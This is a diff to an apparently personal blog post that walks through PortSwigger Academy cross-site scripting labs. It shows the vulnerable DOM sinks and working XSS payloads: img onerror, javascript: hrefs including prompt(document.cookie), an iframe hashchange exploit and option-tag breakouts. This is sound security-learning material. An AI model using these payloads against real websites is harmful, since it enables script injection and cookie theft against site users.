@@ -109,6 +109,7 @@ Just for demostration, I completed a few labs on [PortSwigger Academy](https://p
 The target application use `document.write()` function to display content from `location.search`, which comes from the URL query string. Allows users to modify the URL, and to inject and execute arbitrary scripts in the page.
 <details markdown="1">
   <summary>Click me to expand the process</summary>  
+  
 1. Enter random input (e.g., 123456) in the user input (URL query)
 ~~~
 https[://]web-security-academy.net/?search=123456
@@ -134,6 +135,7 @@ Result: <img src="/resources/images/tracker[.]gif?searchTerms=">
 The application It assigns data from `location.search` to `innerHTML`, which updates the contents of a `<div>`. Since the URL can be controlled by the user, they can inject malicious HTML or scripts.
 <details markdown="1">
   <summary>Click me to expand the process</summary>  
+  
 1. Enter random input (e.g., 123456) in the user input (URL query)
 ~~~
 https[://]web-security-academy.net/?search=123456
@@ -158,10 +160,14 @@ Result: <span id="searchMessage"><img src="x" onerror="javascript:alert('XSS')">
 In this instance, jQuery’s `$` selector is used to find a link and set its `href` using data from `location.search`, which comes from the URL query string.
 <details markdown="1">
   <summary>Click me to expand the process</summary>
+  
 1. Right-click on the webpage and open the inspection tab. I search for `location.search`, which led me to this script:
->  $(function() {  
->      $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));  
->      });
+
+  ```javascript
+  $(function() {  
+    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));  
+    });
+  ```
   
 2. I also notice that the URL contains the `returnPath` query parameter, which aligns with the script. Which uses this query parameter to set the href attribute of the backlink.
 ~~~
@@ -180,6 +186,7 @@ Result: <a id="backLink" href="javascript:prompt(document.cookie)">Back</a>
 This instance contains a stored XSS vulnerability in the comment section. I submit a comment that triggers an alert when the author’s name is clicked.
 <details markdown="1">
   <summary>Click me to expand the process</summary>
+  
 1. In the comment section, there are four fields (Comment, Name, Email, Website). After filling out all the fields and submitting my comment, I notice that the Name section contains an external link, which is the website I enter while filling out the form.
 
 2. I use the search function in the inspection tab to look for the website I enter. And I find:
@@ -199,6 +206,7 @@ Result: <a id="author" href="javascript:alert('Zebra!')">World Smartest Zebra</a
 The application contains a reflected XSS vulnerability in the search blog feature, where angle brackets are HTML-encoded. I inject an attribute via XSS that triggers an alert function.
 <details markdown="1">
   <summary>Click me to expand the process</summary>
+  
 1. Enter random input (e.g., test123) in the user input (URL query)
 ~~~
 URL: https[://]web-security-academy[.]net/?search=test123
@@ -214,22 +222,27 @@ Result: <input type="text" placeholder="Search the blog..." name="search" value=
 URL: https[://]web-security-academy[.]net/?search=test123" onmouseover="alert(test)
 Result: <input type="text" placeholder="Search the blog..." name="search" value="test123" onmouseover="alert(test)">
 ~~~
-{: .box-note}
-**Note:** The `value` attribute is closed early by the injected quote, and `onmouseover="alert(1)` is interpreted as a new `onmouseover` attribute on the <input> tag.
+
+  {: .box-note}
+  **Note:** The `value` attribute is closed early by the injected quote, and `onmouseover="alert(1)` is interpreted as a new `onmouseover` attribute on the \<input\> tag.
 
 4. Once I hover the cursor over the search bar, it triggers the alert. I identify the XSS vulnerability.
 </details>
 -
 
-#### 5. DOM XSS in jQuery selector sink using a hashchange event
+#### 6. DOM XSS in jQuery selector sink using a hashchange event
 There is a DOM-based XSS vulnerability on the home page, where jQuery’s `$()` selector is used to auto-scroll to a post, with the title passed through `location.hash`.
 <details markdown="1">
   <summary>Click me to expand the process</summary>
+  
 1. Firstly, I search for `$()` in the inspection tab, and I find the syntax for this function. Which listens for hash changes in the URL (`/#`) and scrolls the corresponding blog post into view based on the hash value.
-  >  $(window).on('hashchange', function(){  
-  >    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');  
-  >    if (post) post.get(0).scrollIntoView();  
-  >  });  
+  
+  ```javascript
+  $(window).on('hashchange', function(){
+    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+    if (post) post.get(0).scrollIntoView();
+    });
+  ```
   
 2. I append a simple XSS test payload with a hashtag to the URL, and the print function is triggered. The XSS vulnerability in this application is confirmed.
 ~~~
@@ -240,11 +253,86 @@ URL: https[://]web-security-academy[.]net/#<img src=x onerror=print()>
 ~~~
 URL: <iframe src="https[://]web-security-academy[.]net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ~~~
-{: .box-note}
-**Note:** The `onload` attribute of the `iframe` runs JavaScript to append the print payload directly into the URL fragment after the page loads. The vulnerable page inside the iframe then reads this fragment (<img src=x onerror=print()>) and executes the injected payload.
+
+  {: .box-note}
+  **Note:** The `onload` attribute of the `iframe` runs JavaScript to append the print payload directly into the URL fragment after the page loads. The vulnerable page inside the iframe then reads this fragment (<img src=x onerror=print()>) and executes the injected payload.
 
 </details>
 -
 
-#### 6. Reflected XSS into a JavaScript string with angle brackets HTML encoded
-In this instance, the application is vulnerable to reflected XSS in the search query tracking functionality, where angle brackets are encoded. The reflection occurs inside a JavaScript string. I breaks out of the JavaScript string and triggers the alert() function, to demonstrate the vulnerability.
+#### 7. Reflected XSS into a JavaScript string with angle brackets HTML encoded
+In this instance, the application is vulnerable to reflected XSS in the search query tracking functionality, where angle brackets are encoded. The reflection occurs inside a JavaScript string. I break out of the string and triggers the `prompt()` function, to demonstrate the vulnerability.
+<details markdown="1">
+  <summary>Click me to expand the process</summary>
+  
+1. I enter random input (e.g., test) in the user input (search bar)
+  
+2. Utilize search function in inspection tab, and search for input (e.g., test). I find that the input is directly past into the function.
+
+  ```javascript
+    var searchTerms = 'test';
+      document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+  ```
+
+3. Now I learn that my input is inside the single quote, I try breaking out the single quote with:
+~~~
+Input: '-prompt("TestXSS")-' # breaks the single quote
+       or \\'-prompt("TestXSS")// # If single quotes are escaped
+~~~
+
+4. The message pops up after I send the query, which confirms that this instance is vulnerable to XSS. <br> Just to double-check, I pull out the script from the inspection tab.
+
+  ```javascript
+  var searchTerms = ''-prompt("TestXSS")-'';
+  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+  ```
+
+</details>
+-
+
+#### 8. DOM XSS in document.write sink using source location.search inside a select element
+This instance contains a DOM-based XSS vulnerability in the stock checker functionality. It leverages the `document.write` function to output data to the page, using data from `location.search` that user can control through the website URL. The input data is between the `<option>` tag, I break out of it and calls the `prompt` function.
+<details markdown="1">
+  <summary>Click me to expand the process</summary>
+  
+1. Firstly, I discover the function in the inspection tab (`right-click on the webpage > inspect`). <br>And I learn that the script builds a `<select name="storeId">` dropdown by reading a `storeId` query parameter from the URL and, if present, adding it as the selected `<option>` before adding the three hard-coded stores (skipping any duplicate). <br>It uses `document.write` with the raw URL value, so unescaped input could be reflected into the page; creating elements and setting textContent/value.
+
+  ```javascript
+  var stores = ["London", "Paris", "Milan"];
+  var store = (new URLSearchParams(window.location.search)).get('storeId');
+  document.write('<select name="storeId">');
+  if(store) {
+      document.write('<option selected>' + store + '</option>');
+  }
+  
+  for(var i = 0; i < stores.length; i++) {
+      if(stores[i] === store) {
+          continue;
+      }
+      document.write('<option>' + stores[i] + '</option>');
+  }
+  
+  document.write('</select>');
+  ```
+
+2. After discovering that the function takes user input in the `storeId` parameter, I add the `storeId` parameter after the original `productId` parameter with a `&`. I then send a test input (test) to see the application's response. As expected, I am able to add a new selected `<option>`.
+~~~
+URL: https[://]web-security-academy[.]net/product?productId=2&storeId=test
+Result:
+<select name="storeId">
+  <option selected>test</option> # I create this option by inserting the parameter and value in the URL.
+  <option>London</option>
+  <option>Paris</option>
+  <option>Milan</option>
+~~~
+
+3. Remember this syntax `document.write('<option>' + stores[i] + '</option>');` from the function. What I can do is close the first `<option>` tag, inject new HTML tags or event attributes, and then open another `<option>` tag. I try injecting a couple of new HTML tags, and both work. <br>Now, I can confirm that the stock search query function on this web application is vulnerable to XSS.
+~~~
+Payload-1: storeId=test</option><iframe src="javascript:prompt('work?');"></iframe><option>
+Payload-2: storeId=test</option><script>prompt('work?')</script><option>
+~~~
+
+</details>
+-
+
+#### 9. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
